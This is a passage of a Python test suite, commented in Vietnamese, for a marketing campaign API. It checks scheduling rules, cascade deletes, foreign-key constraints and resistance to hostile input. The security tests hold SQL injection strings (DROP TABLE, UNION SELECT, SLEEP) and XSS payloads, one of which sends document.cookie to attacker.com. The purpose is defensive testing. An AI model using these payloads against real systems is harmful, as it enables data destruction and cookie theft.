        assert resp_draft.status_code == 400, f"Scheduled DRAFT content! Got {resp_draft.status_code}"

        # 2. Gửi duyệt (IN_REVIEW) -> Thử lập lịch: Phải từ chối 400
        client.post(f"/api/v1/contents/{cnt_a_id}/submit", headers=mkt_headers)
        resp_in_review = client.post(f"/api/v1/contents/{cnt_a_id}/schedule", json=schedule_payload, headers=mkt_headers)
        assert resp_in_review.status_code == 400

        # 3. Phê duyệt (APPROVED) -> Lập lịch thành công (201 Created)
        client.post(f"/api/v1/contents/{cnt_a_id}/approve", headers=mgr_headers)
        resp_approved = client.post(f"/api/v1/contents/{cnt_a_id}/schedule", json=schedule_payload, headers=mkt_headers)
        assert resp_approved.status_code == 201


# ==============================================================================
# GROUP 4: XSS, SQLi RESILIENCE & DATABASE INTEGRITY / CASCADE DELETE (5 Test Cases)
# ==============================================================================

class TestSecurityPayloadsAndDbIntegrity:
    """Thử nghiệm khả năng chống mã độc (SQLi, XSS) và tính toàn vẹn CSDL (Cascade delete, Foreign Keys)."""

    def test_24_sqli_resilience_in_campaign_search_and_filters(self, client: TestClient, multi_workspace_env):
        """Kiểm tra khả năng chống SQL Injection trong ô tìm kiếm chiến dịch và các bộ lọc."""
        headers = multi_workspace_env["headers"]["mgr_a"]

        sqli_payloads = [
            "' OR 1=1; --",
            "admin'--",
            "' UNION SELECT id, name, null, null FROM users --",
            "'; DROP TABLE campaigns; --",
            "1' AND SLEEP(5) AND '1'='1"
        ]

        for payload in sqli_payloads:
            resp = client.get(f"/api/v1/campaigns?search={payload}", headers=headers)
            assert resp.status_code == 200, f"SQLi payload failed or crashed server: {payload}"
            # Xác minh kết quả không bị lộ toàn bộ bản ghi trái phép
            data = resp.json()
            assert isinstance(data, list)

    def test_25_xss_and_sqli_in_workspace_and_brand_kit(self, client: TestClient, multi_workspace_env, db_session: Session):
        """Kiểm tra lưu trữ an toàn chuỗi XSS và SQLi trong Workspace name và Brand Kit."""
        headers = multi_workspace_env["headers"]["mgr_a"]

        xss_sqli_name = "<script>alert('XSS')</script>'; DROP TABLE workspaces; --"
        usp_payload = "<img src=x onerror=alert(document.cookie)>'; DROP TABLE users; --"

        # 1. Tạo Workspace chứa payload độc hại
        ws_resp = client.post("/api/v1/workspaces", json={
            "name": xss_sqli_name,
            "description": "Thử nghiệm tải độc tính"
        }, headers=headers)
        assert ws_resp.status_code in (200, 201)
        ws_id = ws_resp.json()["id"]

        # 2. Cập nhật Brand Kit chứa payload độc hại
        bk_resp = client.put(f"/api/v1/brand-kit?workspace_id={ws_id}", json={
            "brand_name": "Secure Brand Test",
            "usp": usp_payload,
            "tone_of_voice": "An toàn tuyệt đối",
            "banned_keywords": ["từ cấm 1"]
        }, headers=headers)
        assert bk_resp.status_code == 200

        # 3. Xác minh các bảng trong CSDL vẫn tồn tại nguyên vẹn, không bị DROP
        user_count = db_session.query(User).count()
        assert user_count > 0, "Users table was dropped or compromised by SQLi payload!"
        ws_count = db_session.query(Workspace).count()
        assert ws_count > 0, "Workspaces table was dropped or compromised by SQLi payload!"

    def test_26_xss_and_sqli_in_ai_omnichannel_brief_and_audience(self, client: TestClient, multi_workspace_env, db_session: Session):
        """Kiểm tra xử lý đầu vào chứa XSS/SQLi trong engine AI Omnichannel."""
        headers = multi_workspace_env["headers"]["mgr_a"]
        payload = {
            "brief": "<script>fetch('http://attacker.com?c='+document.cookie)</script>'; DROP TABLE campaigns; --",
            "target_audience": "'; DELETE FROM marketing_contents; --",
            "product_name": "Sản phẩm thử nghiệm bảo mật",
            "channels": ["facebook", "tiktok", "email"]
        }
        resp = client.post("/api/v1/ai/omnichannel", json=payload, headers=headers)
        assert resp.status_code == 200, f"AI Omnichannel failed on hostile input: {resp.text}"
        data = resp.json()
        assert "facebook" in data
        assert "tiktok" in data
        assert "email" in data

        # Kiểm tra bảng campaigns và contents không bị xóa sạch
        camp_count = db_session.query(Campaign).count()
        assert camp_count > 0

    def test_27_db_cascade_deletion_cleans_contents_metrics_reviews(self, client: TestClient, multi_workspace_env, db_session: Session):
        """Thử nghiệm độ bền CSDL: Cascade delete campaign có xóa sạch contents, metrics, review logs, schedules liên quan không."""
        db = db_session
        mgr_headers = multi_workspace_env["headers"]["mgr_a"]
        mkt_headers = multi_workspace_env["headers"]["mkt_a"]
        ws_a_id = multi_workspace_env["ws_a"].id
        user_id = multi_workspace_env["mgr_a"].id

        # 1. Tạo 1 Campaign riêng biệt để thử nghiệm Cascade Delete
        test_camp = Campaign(
            workspace_id=ws_a_id, product_id=1, owner_id=user_id,
            name="Cascade Test Campaign", objective="Kiểm thử cascade delete", audience="Audience",
            start_date="2026-09-01", end_date="2026-09-30", budget=5000000.0, status="ACTIVE"
        )
        db.add(test_camp)
        db.commit()
        db.refresh(test_camp)
        cid = test_camp.id

        # 2. Tạo CampaignMember
        db.add(CampaignMember(campaign_id=cid, user_id=user_id, member_role="OWNER"))

        # 3. Tạo 2 MarketingContent
        cnt1 = MarketingContent(workspace_id=ws_a_id, campaign_id=cid, channel_id=1, created_by=user_id, title="Content 1", body="Body 1", status="DRAFT")
        cnt2 = MarketingContent(workspace_id=ws_a_id, campaign_id=cid, channel_id=2, created_by=user_id, title="Content 2", body="Body 2", status="DRAFT")
        db.add_all([cnt1, cnt2])
        db.commit()
        db.refresh(cnt1)
        db.refresh(cnt2)

        # 4. Tạo Review log và Schedule cho cnt1
        cnt1.status = "APPROVED"
        rev = ContentReview(content_id=cnt1.id, reviewer_id=user_id, decision="APPROVED", reason="Review test")
        sch = MarketingSchedule(content_id=cnt1.id, scheduled_at="2026-10-15T09:00:00Z", timezone="UTC", status="PLANNED", created_by=user_id)
        db.add_all([rev, sch])

        # 5. Tạo 2 CampaignMetric
        m1 = CampaignMetric(campaign_id=cid, channel_id=1, metric_date="2026-09-10", views=1000, clicks=50, conversions=5, cost=100000.0, revenue=500000.0)
        m2 = CampaignMetric(campaign_id=cid, channel_id=2, metric_date="2026-09-11", views=2000, clicks=100, conversions=10, cost=200000.0, revenue=1000000.0)
        db.add_all([m1, m2])
        db.commit()

        # Xác nhận toàn bộ dữ liệu con đã tồn tại trong DB trước khi xóa
        assert db.query(MarketingContent).filter(MarketingContent.campaign_id == cid).count() == 2
        assert db.query(ContentReview).filter(ContentReview.content_id == cnt1.id).count() == 1
        assert db.query(MarketingSchedule).filter(MarketingSchedule.content_id == cnt1.id).count() == 1
        assert db.query(CampaignMetric).filter(CampaignMetric.campaign_id == cid).count() == 2
        assert db.query(CampaignMember).filter(CampaignMember.campaign_id == cid).count() == 1

        # 6. Thực hiện xóa Campaign qua API (RoleChecker yêu cầu role MANAGER)
        manager_delete_headers = make_auth_headers(user_id, "MANAGER")
        del_resp = client.delete(f"/api/v1/campaigns/{cid}", headers=manager_delete_headers)
        assert del_resp.status_code == 204, f"Delete failed: {del_resp.status_code}"

        # 7. Kiểm chứng thực tế: Toàn bộ dữ liệu con bị xóa sạch sẽ, KHÔNG CÒN BẢN GHI RÁC (Zero Orphan Rows)
        assert db.query(Campaign).filter(Campaign.id == cid).first() is None
        assert db.query(MarketingContent).filter(MarketingContent.campaign_id == cid).count() == 0
        assert db.query(ContentReview).filter(ContentReview.content_id == cnt1.id).count() == 0
        assert db.query(MarketingSchedule).filter(MarketingSchedule.content_id == cnt1.id).count() == 0
        assert db.query(CampaignMetric).filter(CampaignMetric.campaign_id == cid).count() == 0
        assert db.query(CampaignMember).filter(CampaignMember.campaign_id == cid).count() == 0

    def test_28_db_foreign_key_violation_and_check_constraints_blocked(self, client: TestClient, multi_workspace_env):
        """Xác minh các vi phạm khóa ngoại (Foreign Key) và Check Constraint bị chặn sạch sẽ không gây sập DB."""
        mgr_headers = multi_workspace_env["headers"]["mgr_a"]
        cid_a = multi_workspace_env["camp_a"].id

        # 1. Tạo Content với non-existent campaign_id
        resp_fk_camp = client.post("/api/v1/contents", json={
            "campaign_id": 999999,
            "channel_id": 1,
            "title": "Invalid FK Campaign",
            "body": "Nội dung lỗi khóa ngoại"
        }, headers=mgr_headers)
        assert resp_fk_camp.status_code in (404, 422)

        # 2. Tạo Content với non-existent channel_id
        resp_fk_chan = client.post("/api/v1/contents", json={
            "campaign_id": cid_a,
            "channel_id": 999999,
            "title": "Invalid FK Channel",
            "body": "Nội dung lỗi kênh"
        }, headers=mgr_headers)
        assert resp_fk_chan.status_code in (404, 422)

        # 3. Tạo Campaign với non-existent product_id
        resp_fk_prod = client.post("/api/v1/campaigns", json={
            "product_id": 999999,
            "name": "Invalid Product FK",
            "objective": "Mục tiêu",
            "audience": "Khách hàng",
            "start_date": "2026-09-01",
            "end_date": "2026-09-30",
            "budget": 1000000.0
        }, headers=mgr_headers)
        assert resp_fk_prod.status_code in (404, 422)

        # 4. Vi phạm ràng buộc ngày kết thúc trước ngày bắt đầu (end_date < start_date)
        resp_date = client.put(f"/api/v1/campaigns/{cid_a}", json={
            "start_date": "2026-09-30",
            "end_date": "2026-09-01"
        }, headers=mgr_headers)
        assert resp_date.status_code == 422, f"Check constraint end_date >= start_date bypassed! Got {resp_date.status_code}"
